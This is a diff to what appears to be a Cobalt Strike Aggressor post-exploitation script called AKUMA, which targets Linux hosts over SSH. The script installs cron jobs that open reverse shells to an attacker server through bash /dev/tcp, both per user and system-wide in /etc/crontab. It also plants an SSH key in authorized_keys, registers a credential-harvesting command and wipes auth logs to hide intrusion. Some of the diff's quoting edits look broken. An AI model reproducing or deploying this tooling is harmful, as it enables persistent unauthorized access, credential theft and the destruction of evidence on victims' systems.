@@ -65,11 +65,11 @@ popup ssh {
 }
 
 # Register SSH commands for direct use
-ssh_command_register("akuma_quick", "AKUMA Quick Foothold deployment", "Synopsis: akuma_quick\nDeploys quick persistence and enumeration");
-ssh_command_register("akuma_full", "AKUMA Full deployment", "Synopsis: akuma_full\nComplete post-exploitation deployment");
-ssh_command_register("akuma_enum", "AKUMA System enumeration", "Synopsis: akuma_enum\nBasic system enumeration");
-ssh_command_register("akuma_persist", "AKUMA Persistence only", "Synopsis: akuma_persist\nInstalls persistence mechanisms");
-ssh_command_register("akuma_creds", "AKUMA Credential harvest", "Synopsis: akuma_creds\nHarvests credentials and secrets");
+ssh_command_register("akuma_quick", "AKUMA Quick Foothold deployment", "Synopsis: akuma_quick - Deploys quick persistence and enumeration");
+ssh_command_register("akuma_full", "AKUMA Full deployment", "Synopsis: akuma_full - Complete post-exploitation deployment");
+ssh_command_register("akuma_enum", "AKUMA System enumeration", "Synopsis: akuma_enum - Basic system enumeration");
+ssh_command_register("akuma_persist", "AKUMA Persistence only", "Synopsis: akuma_persist - Installs persistence mechanisms");
+ssh_command_register("akuma_creds", "AKUMA Credential harvest", "Synopsis: akuma_creds - Harvests credentials and secrets");
 
 # SSH aliases for command line use
 ssh_alias akuma_quick {
@@ -110,7 +110,7 @@ sub akuma_quick_foothold {
     $port = %akuma_config["backup_ports"][0];
     
     blog($bid, "Installing quick persistence...");
-    bshell($bid, "(crontab -l 2>/dev/null; echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . $port . " 0>&1\"') | crontab -");
+    bshell($bid, "(crontab -l 2>/dev/null; echo '*/10 * * * * /bin/bash -i >& /dev/tcp/" . $server . "/" . $port . " 0>&1') | crontab -");
     
     # SSH key
     bshell($bid, "mkdir -p ~/.ssh 2>/dev/null && echo '" . %akuma_config["ssh_key"] . "' >> ~/.ssh/authorized_keys 2>/dev/null && chmod 600 ~/.ssh/authorized_keys 2>/dev/null");
@@ -231,17 +231,17 @@ sub akuma_cron_persistence {
     blog($bid, "Installing cron persistence mechanisms...");
     
     # Main persistence
-    bshell($bid, "(crontab -l 2>/dev/null; echo '*/15 * * * * /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . @ports[0] . " 0>&1\"') | crontab -");
+    bshell($bid, "(crontab -l 2>/dev/null; echo '*/15 * * * * /bin/bash -i >& /dev/tcp/" . $server . "/" . @ports[0] . " 0>&1') | crontab -");
     
     # Reboot persistence
-    bshell($bid, "(crontab -l 2>/dev/null; echo '@reboot sleep 60 && /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . @ports[1] . " 0>&1\"') | crontab -");
+    bshell($bid, "(crontab -l 2>/dev/null; echo '@reboot sleep 60 && /bin/bash -i >& /dev/tcp/" . $server . "/" . @ports[1] . " 0>&1') | crontab -");
     
     # System-wide (if root)
-    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then echo '*/20 * * * * root /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . @ports[2] . " 0>&1\"' >> /etc/crontab 2>/dev/null && echo 'System-wide cron installed'; else echo 'User-level cron only (not root)'; fi");
+    bshell($bid, "if [ '$EUID' -eq 0 ]; then echo '*/20 * * * * root /bin/bash -i >& /dev/tcp/" . $server . "/" . @ports[2] . " 0>&1' >> /etc/crontab 2>/dev/null && echo 'System-wide cron installed'; else echo 'User-level cron only (not root)'; fi");
     
     # Verify installation
     bshell($bid, "echo '=== PERSISTENCE VERIFICATION ==='");
-    bshell($bid, "crontab -l 2>/dev/null | grep -E 'bash.*tcp' | wc -l | awk '{print \"User cron jobs installed: \" $1}'");
+    bshell($bid, "crontab -l 2>/dev/null | grep -c 'bash.*tcp' | awk '{print "User cron jobs installed: " $1}'");
     
     blog($bid, "✅ AKUMA Cron Persistence Complete!");
 }
@@ -400,7 +400,7 @@ sub akuma_cleanup {
     bshell($bid, "rm -rf /var/tmp/.akuma* 2>/dev/null");
     
     bshell($bid, "echo 'Attempting system log cleanup (requires root)...'");
-    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then");
+    bshell($bid, "if [ '$EUID' -eq 0 ]; then");
     bshell($bid, "  echo 'Root detected - clearing system logs'");
     bshell($bid, "  > /var/log/auth.log 2>/dev/null");
     bshell($bid, "  > /var/log/secure 2>/dev/null");
